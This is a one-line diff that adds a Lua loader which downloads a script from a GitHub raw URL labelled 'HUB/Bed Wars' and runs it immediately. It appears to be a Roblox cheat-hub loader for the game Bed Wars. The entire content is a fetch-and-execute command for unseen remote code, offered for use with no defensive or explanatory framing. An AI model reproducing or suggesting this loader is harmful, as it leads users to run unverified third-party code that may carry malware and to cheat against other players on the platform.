@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/illyamarj/HUB/main/Bed%20Wars'))()
